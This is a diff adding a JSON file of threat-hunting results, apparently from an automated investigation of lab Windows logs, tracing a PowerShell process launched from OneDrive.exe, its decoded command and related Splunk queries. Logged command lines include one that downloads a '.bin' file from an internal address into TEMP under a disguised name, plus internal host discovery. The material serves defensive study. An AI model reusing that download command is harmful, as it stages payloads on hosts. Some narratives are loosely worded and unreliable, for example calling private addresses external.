@@ -1,0 +1,376 @@
+[
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T1",
+  "run_id": "T1",
+  "hypothesis_id": "d6b48ef0-L2-T1",
+  "hypothesis": "What is the full ancestry of the `powershell.exe` process?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "The evidence shows two instances of PowerShell processes running on host HOST-LAB000-001. Both executions originate from user HOST-LAB000-001\\Userxx. In both cases, the parent process is OneDrive.exe located at C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe. The PowerShell executables are consistently C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. The command lines involve executing PowerShell with Execution Policy Bypass and an encoded command parameter. Specifically, the encoded command is JABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQA=. This pattern repeats across both process entries.",
+    "observations": [
+     "PowerShell processes executed with encoded commands originating from OneDrive.exe [processes#1] [processes#2]"
+    ],
+    "summaries": [
+     "~ processes#1 — computed over all 2 rows:\n  time: 2026-10-06T11:50:44Z … 2026-10-06T11:50:45Z\n  user: 1 distinct — HOST-LAB000-001\\Userxx=2\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2\n  parent: 2 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1",
+     "~ processes#2 — computed over all 1 rows:\n  time: 2026-10-06T11:50:44Z\n  user: 1 distinct — HOST-LAB000-001\\Userxx=1\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1\n  parent: 1 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1"
+    ],
+    "facts": [
+     "Names in this narrative, computed over every row:",
+     "~ \"powershell.exe\" in these rows is 1 file: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=3",
+     "~ \"onedrive.exe\" in these rows is 1 file: C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=2",
+     "Encoded commands in these rows, decoded by code:",
+     "~ encoded command enc#784267: 3 events, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=2, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1; decodes to: $env:username",
+     "File hashes in these rows, rarest first:",
+     "~ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: SHA256 1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94, 2 events",
+     "Searches that returned no rows:",
+     "~ 1 search returned no rows, including:",
+     "~ search index=windows_lab host=HOST-LAB000-001 sourcetype=XmlWinEventLog EventCode=1 ProcessGuid=\"{66ac357b-cf8e-6ac4-aaf3-030000000e00}\" | table _time ProcessGuid ProcessId Image CommandLine User ParentProcessGuid ParentImage ParentCommandLine"
+    ]
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T2",
+  "run_id": "T2",
+  "hypothesis_id": "d6b48ef0-L2-T2",
+  "hypothesis": "What is the decoded content of the encoded command?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "The evidence shows PowerShell activity on host HOST-LAB000-001 involving encoded commands and network connections. Processes#1 and #2 detail PowerShell executions with different parent processes (OneDrive and System32). Script_blocks#1 contains extensive PowerShell-YAML module operations including imports, assembly loads, and network reachability tests targeting IPs 192.168.77.211 and 192.168.77.212. File_events#1 records a PowerShell writing to disk. All events occur between 10:52 AM and 11:52 AM.",
+    "observations": [
+     "PowerShell executed with encoded commands [processes#1]",
+     "PowerShell connected to external IPs 192.168.77.211 and 192.168.77.212 [script_blocks#1]",
+     "PowerShell wrote to disk [file_events#1]",
+     "PowerShell-YAML module loaded and tested [script_blocks#1]"
+    ],
+    "summaries": [
+     "~ processes#1 — computed over all 2 rows:\n  time: 2026-10-06T11:50:44Z … 2026-10-06T11:50:45Z\n  user: 1 distinct — HOST-LAB000-001\\Userxx=2\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2\n  parent: 2 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1",
+     "~ file_events#1 — computed over all 1 rows:\n  time: 2026-10-06T11:50:44Z\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1\n  event_code: 1 distinct — 11=1",
+     "~ script_blocks#1 — computed over all 88 rows:\n  time: 2026-10-06T10:52:27Z … 2026-10-06T11:52:33Z\n  path: 4 distinct — (absent)=38, C:\\Program Files\\WindowsPowerShell\\Modules\\powershell-yaml\\0…=30, C:\\Program Files\\WindowsPowerShell\\Modules\\powershell-yaml\\0…=10, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1=10",
+     "~ processes#2 — computed over all 2 rows:\n  time: 2026-10-06T11:50:44Z … 2026-10-06T11:50:45Z\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2\n  parent: 2 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1"
+    ],
+    "facts": [
+     "Names in this narrative, computed over every row:",
+     "~ \"powershell.exe\" in these rows is 1 file: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=4",
+     "~ \"onedrive.exe\" in these rows is 1 file: C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=2",
+     "Encoded commands in these rows, decoded by code:",
+     "~ encoded command enc#784267: 4 events, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1; decodes to: $env:username",
+     "File hashes in these rows, rarest first:",
+     "~ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: SHA256 1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94, 2 events",
+     "Private addresses in these rows and this task (not internet-routable):",
+     "~ 192.168.77.212: private address, not internet-routable, 2 events",
+     "~ 10.0.10.1: private address, not internet-routable, 2 events",
+     "~ 192.168.77.211: private address, not internet-routable, 4 events",
+     "Searches that returned no rows:",
+     "~ 1 search returned no rows, including:",
+     "~ search index=windows_lab sourcetype=XmlWinEventLog host=HOST-LAB000-001 EventCode=4104 (Execution_ProcessID IN (2900,6096) OR ProcessID IN (2900,6096)) | table _time, ScriptBlockId, MessageNumber, MessageTotal, ProcessID, Execution_ProcessID, ScriptBlockText, Path | sort _time"
+    ]
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T3",
+  "run_id": "T3",
+  "hypothesis_id": "d6b48ef0-L2-T3",
+  "hypothesis": "Is the user 'Userxx' involved in similar encoded PowerShell activity outside this incident?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "Processes#1 shows 35 events on host HOST-LAB000-001. User Userxx runs PowerShell commands from OneDrive.exe and explorer.exe. Commands include DNS lookups for www.microsoft.com, system uptime measurement, temp directory counts, and encoded commands. Processes#2 details 35 events matching Processes#1. Processes#3 shows 8 events with user HOST-LAB000-001\\Userxx running PowerShell from System32\\WindowsPowerShell\\v1.0\\powershell.exe, including encoded commands and update downloads. Processes#4 covers 50 events with user Userxx running PowerShell from System32\\WindowsPowerShell\\v1.0\\powershell.exe, performing DNS lookups, system uptime, temp counts, and encoded commands. Processes#5 details 50 events identical to Processes#4. Processes#7 shows 18 events with user HOST-LAB000-001$ running PowerShell from System32\\WindowsPowerShell\\v1.0\\powershell.exe, including DNS lookups and system uptime. Script_blocks#1 contains 5 events on host HOST-LAB000-001 with PowerShell loading modules and executing functions like Invoke-LoadFile and Invoke-LoadAssembly. Script_blocks#2 shows 2 events with PowerShell creating directories. Script_blocks#3 contains 100 events with PowerShell loading modules, importing profiles, and executing functions like Invoke-LoadFile and Invoke-LoadAssembly.",
+    "observations": [
+     "[processes#1] [processes#2] [processes#3] [processes#4] [processes#5] [processes#7] [script_blocks#1] [script_blocks#2] [script_blocks#3]"
+    ],
+    "summaries": [
+     "~ processes#1 — computed over all 35 rows:\n  time: 2026-10-05T11:11:44Z … 2026-10-07T08:56:02Z\n  host: 1 distinct — HOST-LAB000-001=35\n  parent: 4 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=16, (absent)=12, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=4, C:\\Windows\\explorer.exe=3",
+     "~ processes#2 — computed over all 35 rows:\n  time: 2026-10-05T11:11:44Z … 2026-10-07T08:56:02Z\n  host: 1 distinct — HOST-LAB000-001=35\n  user: 1 distinct — Userxx=35\n  parent: 4 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=16, (absent)=12, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=4, C:\\Windows\\explorer.exe=3",
+     "~ processes#3 — computed over all 8 rows:\n  time: 2026-10-05T11:41:46Z … 2026-10-06T11:50:45Z\n  host: 1 distinct — HOST-LAB000-001=8\n  user: 1 distinct — HOST-LAB000-001\\Userxx=8\n  parent: 3 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=4, (absent)=3, C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1",
+     "~ script_blocks#1 — computed over all 5 rows:\n  time: 2026-10-05T11:20:49Z … 2026-10-05T11:38:58Z\n  host: 1 distinct — HOST-LAB000-001=5",
+     "~ processes#4 — computed over all 50 rows:\n  time: 2026-10-01T21:04:14Z … 2026-10-07T21:04:56Z\n  host: 1 distinct — HOST-LAB000-001=50\n  user: 3 distinct — Userxx=35, SYSTEM=14, Administrator=1",
+     "~ processes#5 — computed over all 50 rows:\n  time: 2026-10-01T21:04:14Z … 2026-10-07T21:04:56Z\n  host: 1 distinct — HOST-LAB000-001=50\n  user: 3 distinct — HOST-LAB000-001\\Userxx=35, NT AUTHORITY\\SYSTEM=14, HOST-LAB000-001\\Administrator=1\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=50\n  parent: 5 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=16, C:\\Windows\\System32\\CompatTelRunner.exe=14, (absent)=12, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=4, C:\\Windows\\explorer.exe=4",
+     "~ processes#7 — computed over all 18 rows:\n  time: 2026-10-05T11:29:44Z … 2026-10-05T11:38:58Z\n  host: 1 distinct — HOST-LAB000-001=18\n  user: 3 distinct — HOST-LAB000-001$=6, HOST-LAB000-001\\Userxx=6, Userxx=6",
+     "~ script_blocks#2 — computed over all 2 rows:\n  time: 2026-10-05T11:38:44Z … 2026-10-05T11:38:58Z\n  host: 1 distinct — HOST-LAB000-001=2\n  event_code: 1 distinct — 4104=2",
+     "~ script_blocks#3 — computed over all 100 rows:\n  time: 2026-10-05T11:11:44Z … 2026-10-05T11:36:37Z\n  host: 1 distinct — HOST-LAB000-001=100"
+    ],
+    "facts": [
+     "Names in this narrative, computed over every row:",
+     "~ \"powershell.exe\" in these rows is 1 file: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=62",
+     "~ \"onedrive.exe\" in these rows is 1 file: C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=49",
+     "~ \"explorer.exe\" in these rows is 1 file: C:\\Windows\\explorer.exe=10",
+     "Encoded commands in these rows, decoded by code:",
+     "~ encoded command enc#784267: 40 events, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=4, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=16; decodes to: $env:username",
+     "Interpreter and LOLBin command lines in these rows, rarest first:",
+     "~ 8 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=6; command: powershell.exe -ExecutionPolicy Bypass -C \"$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime;Write-Output \\\"System has been running for $($uptime.Days)d $($uptime.Hours)h\\\";\"",
+     "~ 8 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=6; command: powershell.exe -ExecutionPolicy Bypass -C \"$count = (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue).Count;Write-Output \\\"Temp folder contains $count item(s)\\\";\"",
+     "~ 12 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=9; command: powershell.exe -ExecutionPolicy Bypass -C \"try { $resp = Invoke-WebRequest -Uri 'https://www.microsoft.com' -UseBasicParsing -TimeoutSec 8; Write-Output \\\"www.microsoft.com responded with status $($resp.StatusCode)\\\";} catch { Write-Output 'www.microsoft.com did not respond';}\"",
+     "~ 14 row contributions, parent C:\\Windows\\System32\\CompatTelRunner.exe=7; command: powershell.exe -ExecutionPolicy Restricted -Command $res = 0; if(get-vmswitch | Where {$_.NetAdapterInterfaceDescription -ne $null -and $_.NetAdapterInterfaceDescription -eq (Get-NetLbfoTeamNic).InterfaceDescription}){$res=1}; Write-Host \"Final result:\", $res",
+     "~ 14 row contributions, parent C:\\Windows\\System32\\CompatTelRunner.exe=7; command: powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';",
+     "~ 16 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=3; command: powershell.exe -ExecutionPolicy Bypass -C \"$targets = @('10.0.10.1','192.168.77.211','192.168.77.212');$reachable = 0;foreach ($t in $targets) { if (Test-Connection -ComputerName $t -Count 1 -Quiet -ErrorAction SilentlyContinue) { $reachable++ }}Write-Output \\\"Remote system discovery complete: $reachable/$($targets.Count) hosts reachable\\\";\"",
+     "~ 16 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=3; command: powershell.exe -ExecutionPolicy Bypass -C \"$count = (Get-Process).Count;Write-Output \\\"Endpoint inventory check complete: $count processes running\\\";\"",
+     "~ 16 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=3; command: powershell.exe -ExecutionPolicy Bypass -C \"$uri = 'http://192.168.77.211/update/win-agent-2.4.1.bin';$dest = Join-Path $env:TEMP 'svcupdate.dat';Invoke-WebRequest -Uri $uri -OutFile $dest -UseBasicParsing;if (Test-Path $dest) { Write-Output 'SOFTWARE_UPDATE_CHECK_OK' } else { Write-Output 'SOFTWARE_UPDATE_CHECK_FAILED' };\"",
+     "~ 20 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=15; command: powershell.exe -ExecutionPolicy Bypass -C \"try { $result = Resolve-DnsName -Name 'www.microsoft.com' -ErrorAction Stop | Select-Object -First 1; Write-Output \\\"Resolved www.microsoft.com to $($result.IPAddress)\\\";} catch { Write-Output 'Unable to resolve www.microsoft.com';}\"",
+     "File hashes in these rows, rarest first:",
+     "~ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: SHA256 1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94, 50 events",
+     "Private addresses in these rows and this task (not internet-routable):",
+     "~ 192.168.77.212: private address, not internet-routable, 16 events",
+     "~ 10.0.10.1: private address, not internet-routable, 16 events",
+     "~ 192.168.77.211: private address, not internet-routable, 35 events",
+     "Searches that returned no rows:",
+     "~ 1 search returned no rows, including:",
+     "~ (index=windows_lab OR index=win OR index=main OR index=botsv3 OR index=security_log) (EventCode=4624 OR EventCode=4688 OR EventCode=1) (Userxx) | fillnull value=\"-\" host | stats count min(_time) as first by host EventCode sourcetype TargetUserName TargetUserSid SubjectUserName SubjectUserSid User"
+    ]
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T4",
+  "run_id": "T4",
+  "hypothesis_id": "d6b48ef0-L2-T4",
+  "hypothesis": "What network connections were made by the `powershell.exe` process?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "Similarly, no DNS resolution queries were made during this period. All four sets contain zero rows indicating no activity in either category.",
+    "observations": [
+     "No network connections occurred [connections#1] (no rows returned)",
+     "No DNS resolution queries occurred [dns_resolutions#1] (no rows returned)",
+     "No network connections occurred [connections#2] (no rows returned)",
+     "No DNS resolution queries occurred [dns_resolutions#2] (no rows returned)"
+    ],
+    "summaries": [],
+    "facts": [
+     "Searches that returned no rows:",
+     "~ 4 searches returned no rows, including:",
+     "~ search index=windows_lab sourcetype=XmlWinEventLog host=HOST-LAB000-001 EventCode=3 (ProcessGuid=\"{66ac357b-e094-6ac4-89f5-030000000e00}\" OR Image=\"*powershell.exe\") | table _time SourceIp SourcePort DestinationIp DestinationHostname DestinationPort Protocol ProcessGuid Image",
+     "~ search index=windows_lab sourcetype=XmlWinEventLog host=HOST-LAB000-001 EventCode=22 (ProcessGuid=\"{66ac357b-e094-6ac4-89f5-030000000e00}\" OR Image=\"*powershell.exe\") | table _time QueryName QueryResults ProcessGuid Image",
+     "~ search index=windows_lab host=HOST-LAB000-001 (\"66ac357b-e094-6ac4-89f5-030000000e00\" OR \"powershell.exe\") (EventCode=3 OR \"NetworkConnect\" OR \"<EventID>3<\") | table _time sourcetype EventCode SourceIp SourcePort DestinationIp DestinationHostname DestinationPort Protocol ProcessGuid Image"
+    ]
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T5",
+  "run_id": "T5",
+  "hypothesis_id": "d6b48ef0-L2-T5",
+  "hypothesis": "Are there any files written or modified by the `powershell.exe` process?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "The evidence shows ten file writes performed by the process C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe on the host HOST-LAB000-001. Specifically, the process wrote ten distinct files located in the directory C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\. Each file had a filename starting with __PSScriptPolicyTest_ followed by a sequence of random-looking alphanumeric characters and ending with .ps1. The action type for all these events was event_code=11, indicating a file write operation. The files were created between October 6, 2026, at 10:52:27 UTC and October 6, 2026, at 11:52:32 UTC. This activity occurred on the user account Userxx.",
+    "observations": [
+     "Ten file writes were made by C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe to C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\ with filenames starting with __PSScriptPolicyTest_ and ending in .ps1 between 2026-10-06T10:52:27Z and 2026-10-06T11:52:32Z [file_events#1]"
+    ],
+    "summaries": [
+     "~ file_events#1 — computed over all 10 rows:\n  time: 2026-10-06T10:52:27Z … 2026-10-06T11:52:32Z\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=10\n  file: 10 distinct — C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\__PSScriptPolicyTest_dc…=1, C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\__PSScriptPolicyTest_e5…=1, C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\__PSScriptPolicyTest_eu…=1, C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\__PSScriptPolicyTest_ge…=1, C:\\Users\\Userxx\\AppData\\Local\\Temp\\4\\__PSScriptPolicyTest_gn…=1, … 5 more\n  event_code: 1 distinct — 11=10"
+    ],
+    "facts": []
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T6",
+  "run_id": "T6",
+  "hypothesis_id": "d6b48ef0-L2-T6",
+  "hypothesis": "Was the `powershell.exe` process launched from a non-standard directory?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "Processes#1 shows repeated executions of splunk-powershell.exe originating from splunkd.exe on host HOST-LAB000-001. All instances occur between 2026-10-06T10:59:03Z and 2026-10-06T11:24:03Z. User NT AUTHORITY\\SYSTEM runs these processes. Command lines vary slightly, with some including \"--ps2\". \nProcesses#2 displays ten executions of WindowsPowerShell.exe by user HOST-LAB000-001\\Userxx. Parent processes include OneDrive.exe and another PowerShell instance. Executions span from 2026-10-06T10:52:27Z to 2026-10-06T11:52:32Z. Command lines include encoded scripts and network operations targeting IP addresses.",
+    "observations": [
+     "Multiple splunk-powershell.exe executions initiated by splunkd.exe on host HOST-LAB000-001 [processes#1]",
+     "Ten PowerShell executions by user HOST-LAB000-001\\Userxx with varied command lines [processes#2]"
+    ],
+    "summaries": [
+     "~ processes#1 — computed over all 50 rows:\n  time: 2026-10-06T10:59:03Z … 2026-10-06T11:24:03Z\n  user: 1 distinct — NT AUTHORITY\\SYSTEM=50\n  process: 1 distinct — C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powersh…=50\n  parent: 1 distinct — C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe=50",
+     "~ processes#2 — computed over all 10 rows:\n  time: 2026-10-06T10:52:27Z … 2026-10-06T11:52:32Z\n  user: 1 distinct — HOST-LAB000-001\\Userxx=10\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=10\n  parent: 3 distinct — (absent)=4, C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=4, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2"
+    ],
+    "facts": [
+     "Names in this narrative, computed over every row:",
+     "~ \"splunk-powershell.exe\" in these rows is 1 file: C:\\Program Files\\SplunkU…Forwarder\\bin\\splunk-powershell.exe=50",
+     "~ \"splunkd.exe\" in these rows is 1 file: C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe=50",
+     "~ \"onedrive.exe\" in these rows is 1 file: C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=4",
+     "~ \"powershell.exe\" in these rows is 1 file: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=10",
+     "Encoded commands in these rows, decoded by code:",
+     "~ encoded command enc#784267: 4 events, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2; decodes to: $env:username",
+     "Interpreter and LOLBin command lines in these rows, rarest first:",
+     "~ 2 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1; command: powershell.exe -ExecutionPolicy Bypass -C \"$targets = @('10.0.10.1','192.168.77.211','192.168.77.212');$reachable = 0;foreach ($t in $targets) { if (Test-Connection -ComputerName $t -Count 1 -Quiet -ErrorAction SilentlyContinue) { $reachable++ }}Write-Output \\\"Remote system discovery complete: $reachable/$($targets.Count) hosts reachable\\\";\"",
+     "~ 2 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1; command: powershell.exe -ExecutionPolicy Bypass -C \"$count = (Get-Process).Count;Write-Output \\\"Endpoint inventory check complete: $count processes running\\\";\"",
+     "~ 2 row contributions, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1; command: powershell.exe -ExecutionPolicy Bypass -C \"$uri = 'http://192.168.77.211/update/win-agent-2.4.1.bin';$dest = Join-Path $env:TEMP 'svcupdate.dat';Invoke-WebRequest -Uri $uri -OutFile $dest -UseBasicParsing;if (Test-Path $dest) { Write-Output 'SOFTWARE_UPDATE_CHECK_OK' } else { Write-Output 'SOFTWARE_UPDATE_CHECK_FAILED' };\"",
+     "File hashes in these rows, rarest first:",
+     "~ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: SHA256 1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94, 10 events",
+     "~ C:\\Program Files\\SplunkU…Forwarder\\bin\\splunk-powershell.exe: SHA256 211CC17F7C47B5CCF2B980A2091D392C73C9ABADDB1061CE419C5357DD5545C2, 50 events",
+     "Private addresses in these rows and this task (not internet-routable):",
+     "~ 192.168.77.212: private address, not internet-routable, 2 events",
+     "~ 10.0.10.1: private address, not internet-routable, 2 events",
+     "~ 192.168.77.211: private address, not internet-routable, 4 events"
+    ]
+   }
+  ],
+  "retrieval": {
+   "unanswerable": [],
+   "gaps": []
+  }
+ },
+ {
+  "schema_version": 2,
+  "task_id": "d6b48ef0-L2-T7",
+  "run_id": "T7",
+  "hypothesis_id": "d6b48ef0-L2-T7",
+  "hypothesis": "What is the integrity level of the `powershell.exe` process?",
+  "findings": [
+   {
+    "domain": "identity",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "network",
+    "narrative": "",
+    "observations": [],
+    "summaries": [],
+    "facts": []
+   },
+   {
+    "domain": "endpoint",
+    "narrative": "The evidence shows two sets of process activity. Set processes#1 reports 50 events of splunk-powershell.exe being launched by splunkd.exe, occurring between 2026-10-06T10:59:03Z and 2026-10-06T11:24:03Z. All instances use the \"--ps2\" argument. Set processes#2 reports two events of powershell.exe being launched by OneDrive.exe and Windows PowerShell itself, occurring between 2026-10-06T11:50:44Z and 2026-10-06T11:50:45Z. One uses an encoded command, the other bypasses execution policies.",
+    "observations": [
+     "Process splunk-powershell.exe started multiple times by splunkd.exe using the \"--ps2\" argument [processes#1].",
+     "User HOST-LAB000-001\\Userxx executed PowerShell commands via OneDrive.exe and Windows PowerShell [processes#2]."
+    ],
+    "summaries": [
+     "~ processes#1 — computed over all 50 rows:\n  time: 2026-10-06T10:59:03Z … 2026-10-06T11:24:03Z\n  user: 1 distinct — NT AUTHORITY\\SYSTEM=50\n  process: 1 distinct — C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunk-powersh…=50\n  parent: 1 distinct — C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe=50",
+     "~ processes#2 — computed over all 2 rows:\n  time: 2026-10-06T11:50:44Z … 2026-10-06T11:50:45Z\n  user: 1 distinct — HOST-LAB000-001\\Userxx=2\n  process: 1 distinct — C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2\n  parent: 2 distinct — C:\\Users\\Userxx\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.ex…=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1"
+    ],
+    "facts": [
+     "Names in this narrative, computed over every row:",
+     "~ \"splunk-powershell.exe\" in these rows is 1 file: C:\\Program Files\\SplunkU…Forwarder\\bin\\splunk-powershell.exe=50",
+     "~ \"splunkd.exe\" in these rows is 1 file: C:\\Program Files\\SplunkUniversalForwarder\\bin\\splunkd.exe=50",
+     "~ \"powershell.exe\" in these rows is 1 file: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=2",
+     "~ \"onedrive.exe\" in these rows is 1 file: C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1",
+     "Encoded commands in these rows, decoded by code:",
+     "~ encoded command enc#784267: 2 events, parent C:\\Users\\Userxx\\AppData\\…cal\\Microsoft\\OneDrive\\OneDrive.exe=1, C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe=1; decodes to: $env:username",
+     "File hashes in these rows, rarest first:",
+     "~ C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe: SHA256 1C84C8632C5269F24876ED9F49FA810B49F77E1E92E8918FC164C34B020F9A94, 2 events",
